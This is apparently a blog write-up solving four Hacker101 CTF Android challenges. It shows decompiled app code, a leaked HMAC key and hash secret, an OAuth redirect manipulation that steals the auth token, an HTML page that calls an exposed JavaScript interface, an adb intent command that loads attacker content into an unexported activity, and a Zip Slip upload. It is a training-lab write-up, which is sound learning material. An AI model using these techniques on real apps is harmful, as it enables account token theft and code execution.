---
title: Hackerone Android Challenges Writeups
author: Muhammad Adel
date: 2022-03-07 16:40:00 +0200
categories: [Hackerone CTF]
tags: [android security, writeups]
---
Peace be upon all of you, on this writeup I am going to cover the solutions of all android challenges on Hackerone (Thermostat - Intentional Exercise - Oauthbreaker - Webdev).


**Difficulty:** Easy and moderate


**Challenge Link:** https://ctf.hacker101.com/ctf

## Thermostat
Let's start by downloading the provided APK. and then install it in our emulator I am using Android Studio with Nexus 5 API 29. opening the application we find the following:
![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzhnspC86QpTMcEsuZLGz%2Fuploads%2F2lxlBIt3u0VvxPx78ahi%2F1-App.png?alt=media&token=5d933176-1904-4543-8e20-a11d5abc7943)

hmm! nothing to be interesting and only a plus and mins button to reduce the temperature. maybe there are some hidden requests. So we need to inspect the traffic through our proxy I will be using burp suite. the following will help to Configuring your Android to Work With Burp:
[https://www.youtube.com/watch?v=lq4wprdLpbo](https://www.youtube.com/watch?v=lq4wprdLpbo)
I configured burp and run the program and the first request was congaing the first flag:
![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzhnspC86QpTMcEsuZLGz%2Fuploads%2F3QOH0xKB7Bl1vHQukHea%2F1-1_flag.png?alt=media&token=b018029d-3beb-4b7a-9c38-2338bfeaeb86)
I looked for other requests to find the second flag but I found nothing. One of the hints were saying `Access to the source code would help`. Nice Let's pass our APK file to [JADx-GUI](https://github.com/skylot/jadx) which is an application helps you to decompile and reverse APKs file to read the source code.
By looking through the source code I found the following function which contains the first and second flag.
![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzhnspC86QpTMcEsuZLGz%2Fuploads%2F6UsG6SLjd70o31A0EJrL%2F1-2_flag.png?alt=media&token=8965f489-2d01-4fca-a2a8-9a7819851616)

## Intentional **Exercise**
First, Let's download and install the APK in our emulator. Once, we open the application the following request will be made from the application request:
![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzhnspC86QpTMcEsuZLGz%2Fuploads%2F6Yg8SYoCVjCEu6jRnetj%2F2-burp-request.png?alt=media&token=075df2d2-ee66-4201-96fb-388cc8ffbc8c)
But after clicking the flag link it returns an invalid request. Let's examine the source code using jadx-gui to see what is happening:
![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzhnspC86QpTMcEsuZLGz%2Fuploads%2FU0QKGHKsFyqTteuA9bVq%2F2-code.png?alt=media&token=bebe230f-611a-458d-a099-eca3491a5e95)
After examining the source code it is very important to track the value of each variable to be able to form the correct URL and retrieve the flag.
```java
 Uri data = getIntent().getData(); // data = retrive the application URI
 String str = "http://35.227.24.107/2b8b8cfd16/appRoot";
 String str2 = BuildConfig.FLAVOR;  // str = ""
if (data != null) {
  str2 = data.toString().substring(28);  // truncate the first 28 character from the URI
  str = str + str2; // if data = "http://35.227.24.107/2b8b8cfd16/appRoot/flagBearer"
                    // So str2 = "/flagBearer"
                    // str = "http://35.227.24.107/2b8b8cfd16/appRoot/flagBearer"
}              
if (!str.contains("?")) {
  str = str + "?"; // appeand ? to the str Value
}
try {
  MessageDigest instance = MessageDigest.getInstance("SHA-256");
  instance.update("s00p3rs3cr3tk3y".getBytes(StandardCharsets.UTF_8)); 
  instance.update(str2.getBytes(StandardCharsets.UTF_8)); // SHA256(s00p3rs3cr3tk3y + str2)
  webView.loadUrl(str + "&hash=" + String.format("%064x", new BigInteger(1, instance.digest())));
}
```
So the Full URL will be:
http://35.227.24.107/2b8b8cfd16/appRoot/flagBearer?hash=SHA256(s00p3rs3cr3tk3y/flagBearer)
We can use a [SHA256](https://emn178.github.io/online-tools/sha256.html) online website to encrypt out string:
```
s00p3rs3cr3tk3y/flagBearer == 8743a18df6861ced0b7d472b34278dc29abba81b3fa4cf836013426d6256bd5e
```
Let's send the request:
![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzhnspC86QpTMcEsuZLGz%2Fuploads%2FnR59jTkq7HtGrdvO79mj%2F2-flag.png?alt=media&token=38ee426d-d1f6-46aa-b989-5aaf0678622f)

## Oauthbreaker
After doing the initial stuff as above let's try to understand what the application is doing. First, you open the application and you see one button as the following:

![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzhnspC86QpTMcEsuZLGz%2Fuploads%2F534KcIhKpLXfuiMGy1dC%2Fimage.png?alt=media&token=84143e9a-d8db-4637-bb47-7ccf034ac897)

When is button is clicked it redirects us to the web browser giving the us following:

![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzhnspC86QpTMcEsuZLGz%2Fuploads%2FraQzGem4RftyT2BgVZD2%2Fimage.png?alt=media&token=7e193b74-45d6-4d87-b884-88a813f2330f)

Then click the hyper linked you will be redirected again to the application and returning an empty activity.

![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzhnspC86QpTMcEsuZLGz%2Fuploads%2F4kVguDQzyzMyKAqr9xiu%2Fimage.png?alt=media&token=d3b37430-1a9b-4428-b2f6-ecb48c00bb4f)

Let's look at the requests on burp suite:
![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzhnspC86QpTMcEsuZLGz%2Fuploads%2F0jPPpEQb8OiSddJczaOM%2Fimage.png?alt=media&token=9f56a3db-e7ef-4b00-8a53-7698043ce219)

Then
![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzhnspC86QpTMcEsuZLGz%2Fuploads%2FJVrH83lFhdziZTgMgpkP%2Fimage.png?alt=media&token=059956fe-b51d-4c0a-8996-93c82cfbfc77)

a very common misconfiguration on OAuth protocol is the ability to manipulate the redirect_url value to redirect the Auth token to a server that you own let's try it:
![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzhnspC86QpTMcEsuZLGz%2Fuploads%2F3vKhU5GkZspq3jF0ceQD%2Fimage.png?alt=media&token=cab91883-1399-43ef-8419-15df6a5658fc)
Great we got the first flag! Let's examine the application source code a bit deeper. In the AndroidManifiest.xml:
```xml
<activity android:name="com.hacker101.oauth.Browser">
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:scheme="oauth" android:host="final" android:pathPrefix="/"/>
            </intent-filter>
        </activity>
        <activity android:name="com.hacker101.oauth.MainActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:scheme="oauth" android:host="login" android:pathPrefix="/"/>
            </intent-filter>
        </activity>
```
We can see that we have two activities `MAIN` and `Browser` with two intent filters. Also it's important to note that there is no the `exported=false` flag which mean that those activities can be accessed individually which is a BUG refer to the following URL for more info:
[https://hackerone.com/reports/328486](https://hackerone.com/reports/328486)
By looking at the source code of the MainActivity.java we can understand why the first bug occurs.
```java
public class MainActivity extends AppCompatActivity implements View.OnClickListener {
    String authRedirectUri;
    Button button;

    /* JADX INFO: Access modifiers changed from: protected */
    @Override // androidx.appcompat.app.AppCompatActivity, androidx.fragment.app.FragmentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    @RequiresApi(api = 19)
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        setContentView(R.layout.activity_main);
        this.authRedirectUri = "oauth://final/";
        try {
            Uri data = getIntent().getData();
            if (!(data == null || data.getQueryParameter("redirect_uri") == null)) {
                this.authRedirectUri = data.getQueryParameter("redirect_uri");
            }
        } catch (Exception unused) {
        }
        this.button = (Button) findViewById(R.id.button);
        this.button.setOnClickListener(this);
    }

    @Override // android.view.View.OnClickListener
    public void onClick(View view) {
        if (view.getId() == R.id.button) {
            String str = null;
            try {
                str = "http://35.227.24.107/307f6c07e3/oauth?redirect_url=" + URLEncoder.encode(this.authRedirectUri, StandardCharsets.UTF_8.toString()) + "login&response_type=token&scope=all";
            } catch (UnsupportedEncodingException e) {
                e.printStackTrace();
            }
            Intent intent = new Intent("android.intent.action.VIEW");
            intent.setData(Uri.parse(str));
            startActivity(intent);
        }
    }
```
That is because the `redirect_url` value taken from the user it self as indicated at line 28.
Moving to the `Browser` Activity and Looking further down in the source code:
```java
public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        setContentView(R.layout.activity_browser);
        String str = "http://35.227.24.107/307f6c07e3/authed";
        try {
            Uri data = getIntent().getData();
            if (!(data == null || data.getQueryParameter("uri") == null)) {
                str = data.getQueryParameter("uri");
            }
        } catch (Exception unused) {
        }
        WebView webView = (WebView) findViewById(R.id.webview);
        webView.setWebViewClient(new SSLTolerentWebViewClient(webView));
        webView.getSettings().setJavaScriptEnabled(true);
        webView.addJavascriptInterface(new WebAppInterface(getApplicationContext()), "iface");
        webView.loadUrl(str);
    }
```
I can see a variable called `str` at line 4. Declared to have a value set to the URL address. That URL address is the success message I saw earlier telling me I was authenticated. Check that the intent data used to start the activity and the intent parameter named `uri` are empty. Then make the `str` value equal to the data contained in the `uri` intent parameter.

Beneath this at line 12, I can see that a new `WebView` is created. Two important pieces of information are noted when the WebView is being created. The first is that the WebView has enabled JavaScript execution using `setJavascriptEnabled()`. The second is that the method `addJavascriptInterface()`  is declared. This injects a supplied Java object into the WebView and allows the Java object's methods to be accessed from JavaScript. This method takes two parameters:

1. The class instance to bind to JavaScript (i.e. WebAppInterface)
2. The name to be used to expose the instance in JavaScript (i.e. iface).

This allows me to take control of any methods inside the `WebAppInterface` class. Looking at this class, I can see an interesting method called `getFlagPath()`. This method contains what appears to be a large array of int values as seen below.
```java
public String getFlagPath() {
        int[] iArr = {174, 95, 10, 184, 102, 20, 194, 114, 29, 205, 126, 42, 213, 137, 49, 223, 141, 59, 239, 155, 70, 244, 162, 82, 253, 173, 94, 10, 182, 100, 18, 192, 110, 33, 201, 119, 43, 212, 133, 48, 222, 142, 57, 233, 154, 70, 247, 160, 83, 251, 169, 87, 5, 179, 97, 21, 190, 108, 26, 200, 121, 36, 212, 127, 45, 221, 142, 58, 235, 148, 71, 240, 158, 76, 250, 173, 85, 7, 178, 96, 16, 187, 107, 28, 200, 115, 33, 207, 131, 43, 223, 136, 54, 228, 151, 63, 237, 155, 73, 247, 165, 83, 7, 179, 94, 12, 186, 106, 21, 195, 113, 31, 205, 125, 46, 218, 133, 51, 231, 144, 65, 236, 154, 74, 245, 165, 86, 2, 179, 91, 9, 183, 101, 19, 193, 111, 35, 204, 122, 40, 214, 132, 50, 224, 147, 63, 234, 154, 69, 243, 163, 84, 0, 171, 95, 8, 182, 103, 18, 192, 110, 28, 202, 122, 37, 211, 129, 49, 226, 142, 63, 232, 153, 68, 242, 160, 80, 251, 171, 92, 8, 180, 98, 16, 190, 113, 29, 200, 118, 38, 209, 129, 50, 222, 137, 61, 233, 148, 68, 239, 157, 77, 254, 170, 86, 9, 177, 99, 14, 188, 108, 23, 199, 120, 36, 213, 126, 47, 218, 138, 53, 227, 147, 68, 240, 156, 79, 247, 165, 83, 1, 175, 97, 12, 188, 103, 21, 195, 115, 36, 208, 129, 42, 221, 134, 52, 226, 144, 62, 239, 154, 74, 245, 163, 83, 4, 176, 97, 10, 184, 107, 23, 194, 112, 32, 203, 123, 44, 216, 131, 49, 223, 141, 65, 234, 152, 70, 244, 167, 79, 3, 172, 93, 8, 184, 99, 17, 193, 114, 30, 207, 123, 38, 212, 132, 47, 223, 144, 60, 237, 149, 67, 241, 159, 83, 251, 169, 87, 5, 185, 98, 16, 190, 113, 26, 200, 118, 36, 213, 128, 48, 219, 137, 57, 234, 150, 71, 243, 158, 76, 252, 167, 87, 8, 180, 95, 13, 193, 106, 24, 198, 121, 33, 207, 131, 47, 218, 138, 53, 227, 147, 68, 240, 156, 79, 247, 165, 87, 2, 178, 93, 11, 185, 105, 26, 198, 119, 31, 205, 123, 47, 216, 134, 52, 226, 144, 62, 236, 154, 77, 246, 167, 82, 0, 174, 94, 9, 185, 106, 22, 193, 117, 33, 204, 122, 42, 213, 133, 54, 226, 141, 59, 233, 151, 75, 244, 162, 80, 254, 172, 90, 11, 182, 102, 17, 191, 111, 32, 204, 125, 41, 212, 130, 50, 221, 141, 62, 234, 149, 73, 245, 160, 80, 251, 169, 89, 10, 182, 97, 21, 190, 111, 26, 200, 120, 35, 211, 132, 48, 220, 143, 55, 233, 148, 68, 239, 157, 77, 254, 170, 85, 9, 178, 96, 14, 188, 111, 23, 203, 119, 34, 208, 128, 43, 219, 140, 56, 227, 145, 63, 237, 155, 79, 248, 171, 84, 2, 179, 94, 14, 185, 103, 23, 200, 116, 37, 209, 124, 42, 218, 133, 53, 230, 146, 67, 235, 153, 71, 245, 163, 81, 5, 174, 92, 10, 184, 102, 25, 193, 111, 29, 203, 127, 43, 214, 132, 50, 224, 142, 62, 233, 151, 69, 243, 163, 84, 0, 171, 95, 7, 187, 103, 18, 192, 112, 27, 203, 124, 40, 211, 129, 47, 221, 139, 57, 231, 155};
        String str = BuildConfig.FLAVOR;
        byte[] bArr = new byte[65536];
        int i = 0;
        while (i < iArr.length) {
            int i2 = i + 1;
            iArr[i] = (((iArr[i] + 256000) - i) - (i2 * 173)) % 256;
            i = i2;
        }
        int i3 = 0;
        int i4 = 0;
        while (i3 < iArr.length) {
            if (iArr[i3] == 3) {
                i4 = i4 == 65535 ? 0 : i4 + 1;
            } else if (iArr[i3] == 2) {
                i4 = i4 == 0 ? 65535 : i4 - 1;
            } else if (iArr[i3] == 0) {
                bArr[i4] = (byte) (bArr[i4] + 1);
            } else if (iArr[i3] == 1) {
                bArr[i4] = (byte) (bArr[i4] - 1);
            } else if (iArr[i3] == 6) {
                str = str + String.valueOf((char) bArr[i4]);
            } else if (iArr[i3] == 4 && bArr[i4] == 0) {
                int i5 = i3 + 1;
                int i6 = 0;
                while (true) {
                    if (i6 <= 0 && iArr[i5] == 5) {
                        break;
                    }
                    if (iArr[i5] == 4) {
                        i6++;
                    } else if (iArr[i5] == 5) {
                        i6--;
                    }
                    i5++;
                }
                i3 = i5;
            } else if (iArr[i3] == 5 && bArr[i4] != 0) {
                int i7 = i3 - 1;
                int i8 = 0;
                while (true) {
                    if (i8 <= 0 && iArr[i7] == 4) {
                        break;
                    }
                    if (iArr[i7] == 5) {
                        i8++;
                    } else if (iArr[i7] == 4) {
                        i8--;
                    }
                    i7--;
                }
                i3 = i7 - 1;
            }
            i3++;
        }
        return str + ".html";
    }
```
the code below this appears to perform a variety of operations that result in a path to a html file being created which should contains the flag. To call this method, I can create a simple web server an host the following html file to execute the `getFlagPath()` method.
```html
<html>
<head>
</head>
    <body>
    <div id="flag"></div>
        <script>
        document.getElementById("flag").innerHTML = iface.getFlagPath()
        </script>
    </body>
</html>
```
Then leveraging the second activity which as we said above isn't protected and doesn't contain the `exported=false` flag which could allow us to access it directly. we will access it via the host final and the scheme `oauth://` and adding the `uri` parameter for redirection. Using the following command:
```bash
adb shell am start -W -a android.intent.action.VIEW -d "oauth://final/?uri=EXPLOIT-LINK" com.hacker101.oauth
```
And we will get the path for the second flag:
![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzhnspC86QpTMcEsuZLGz%2Fuploads%2Fp4jD8YCxNhqK0yvcfXye%2Fimage.png?alt=media&token=50ee68aa-96be-4b13-8360-6ec6c5341563)
then access http://35.227.24.107/307f6c07e3/PATH.htmlto get the flag.
![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzhnspC86QpTMcEsuZLGz%2Fuploads%2FbDhPcKKL1g5O3xnycdk7%2Fimage.png?alt=media&token=305e0bf8-b835-41ad-99ee-42066f6b7596)
Anther simple way to get the path of the flag is by running the `getFlagPath()` method in any online java compiler and you will get the path.
![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzhnspC86QpTMcEsuZLGz%2Fuploads%2FbgneQFTOnoRF7vbDPtu5%2Fimage.png?alt=media&token=ed623530-124f-4a40-a54e-b8afba397451)

## Webdev
Getting everything ready for testing and start browsing the application. first the APK start with following page:
![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzhnspC86QpTMcEsuZLGz%2Fuploads%2FCWRnM2NnBaX7olCJY9jK%2Fwebdev-1.png?alt=media&token=68d70d42-f3ba-473a-9ff2-6fca5d141828)

If we click on Edit we will have the ability to edit an index.html file:
![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzhnspC86QpTMcEsuZLGz%2Fuploads%2FXhBYLTengcS35FeS6oDS%2Fimage.png?alt=media&token=3a1be9d2-14ca-4238-9d39-725f8a4a37ff)

I tried to put XSS code in the html file but nothing happens. at this point I didn't know what I should do and what is the idea of the challenge. So I decided to enumerate more by looking at burp traffic I found this request:
![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzhnspC86QpTMcEsuZLGz%2Fuploads%2FjL5eIoNr9ANC4IIbIYD4%2Fimage.png?alt=media&token=d189806b-954f-4a05-b5f8-471d8a759eb5)

So there is a file upload functionality under upload.php:
![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzhnspC86QpTMcEsuZLGz%2Fuploads%2Fl0dx7lK9zDCTZhEeUvUw%2Fwebdev-upload.png?alt=media&token=1d755710-546c-4860-8a76-1949b88aa63b)

It only accepts zip file so I uploaded one but an error occurred
![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzhnspC86QpTMcEsuZLGz%2Fuploads%2FgECWKoy8e6t9NWje9u2f%2Fwebdev-HMAC.png?alt=media&token=be280895-0554-44d5-b9dc-711a04b1003e)

Hmm! let's examine the source code to see what is happening. in AndroidManifest.xml:
```xml
<activity android:name="com.hacker101.webdev.MainActivity">
        <intent-filter>
            <action android:name="android.intent.action.MAIN"/>
            <category android:name="android.intent.category.LAUNCHER"/>
        </intent-filter>
</activity>
```
there is only one activity. So let's at its source code:
```java
public class MainActivity extends AppCompatActivity implements View.OnClickListener {
    Button editButton;
    Button refreshButton;
    WebView webView;
    Boolean editing = false;
    protected String HmacKey = "8c34bac50d9b096d41cafb53683b315690acf65a11b5f63250c61f7718fa1d1d";

    /* loaded from: classes.dex */
    private class SSLTolerantWebViewClient extends WebViewClient {
        WebView webView;

        SSLTolerantWebViewClient(WebView webView) {
            this.webView = webView;
        }

        @Override // android.webkit.WebViewClient
        public boolean shouldOverrideUrlLoading(WebView webView, String str) {
            this.webView.loadUrl(str);
            return true;
        }

        @Override // android.webkit.WebViewClient
        public void onReceivedSslError(WebView webView, SslErrorHandler sslErrorHandler, SslError sslError) {
            super.onReceivedSslError(webView, sslErrorHandler, sslError);
            sslErrorHandler.proceed();
        }
    }

    protected String Hmac(byte[] bArr) throws Exception {
        throw new Exception("TODO: Implement this and expose to JS");
    }

    /* JADX INFO: Access modifiers changed from: protected */
    @Override // androidx.appcompat.app.AppCompatActivity, androidx.fragment.app.FragmentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    @RequiresApi(api = 19)
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        setContentView(R.layout.activity_main);
        this.editButton = (Button) findViewById(R.id.edit);
        this.editButton.setOnClickListener(this);
        this.refreshButton = (Button) findViewById(R.id.refresh);
        this.refreshButton.setOnClickListener(this);
        this.webView = (WebView) findViewById(R.id.webview);
        WebView webView = this.webView;
        webView.setWebViewClient(new SSLTolerantWebViewClient(webView));
        this.webView.getSettings().setJavaScriptEnabled(true);
        this.webView.loadUrl("http://35.227.24.107/407fb9155e/content/");
    }

    @Override // android.view.View.OnClickListener
    public void onClick(View view) {
        int id = view.getId();
        if (id != R.id.edit) {
            if (id == R.id.refresh) {
                this.webView.reload();
            }
        } else if (this.editing.booleanValue()) {
            this.editButton.setText("Edit");
            this.webView.loadUrl("http://35.227.24.107/407fb9155e/content/");
            this.editing = false;
        } else {
            this.editButton.setText("View");
            this.webView.loadUrl("http://35.227.24.107/407fb9155e/edit.php");
            this.editing = true;
        }
    }
}
```
at line 6 we can see that there is a HMAC key and the rest of the code is routing of the application and also note at line 46 the use of `setJavaScriptEnabled` which indicate that if open this app in browser our code XSS code will run normally due to the use of JavaScript.

As we saw earlier while trying to upload the file we get "HMAC missing" after some research I found that the uploaded file has to be signed with HMAC key to be validated. So I signed a random file in [cyberchef](https://gchq.github.io/CyberChef) and upload it.
![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzhnspC86QpTMcEsuZLGz%2Fuploads%2F0GngH6MXztQjdjgJrdbV%2Fwebdev-cyberchef.png?alt=media&token=83f363af-df08-4a53-802a-dfa68db38d47)

Copying the value and add it in our file upload functionality.
![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzhnspC86QpTMcEsuZLGz%2Fuploads%2FL2evv7BE3u9tRta85oIB%2Fwebdev-flag1.png?alt=media&token=4decb629-3605-4bf2-801c-f4104dae8dee)
Great we got the first flag!

So what else can be exploited? Since this file upload functionality only accepts .zip I think this a hint for a vulnerability called [ZIP Slip Attack](https://github.com/snyk/zip-slip-vulnerability):

> Zip Slip is a widespread critical archive extraction vulnerability, allowing attackers to write arbitrary files on the system, typically resulting in remote command execution. It was discovered and responsibly disclosed by the Snyk Security team ahead of a public disclosure on 5th June 2018, and affects thousands of projects, including ones from HP, Amazon, Apache, Pivotal and many more. This page provides the most up-to-date fix statuses for the libraries and projects that were found to be exploitable or contain a vulnerable implementation.

So let's pick any POC for the vulnerability from the internet and then signed again with HMAC id and upload it:
![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzhnspC86QpTMcEsuZLGz%2Fuploads%2FH6PYWxfgvK26GlX0nWlG%2Fwebdev-flag2.png?alt=media&token=314e3e7b-9964-4af1-bdfd-2dadd12abdde)
Voila!! it worked!

## References
- <https://infosecwriteups.com/hacker101-ctf-android-challenge-writeups-f830a382c3ce>
-   <https://pymotw.com/2/hmac/>
-   <https://github.com/snyk/zip-slip-vulnerability>
-   <https://www.tutorialspoint.com/compile_java_online.php>
-   <https://hackerone.com/reports/328486>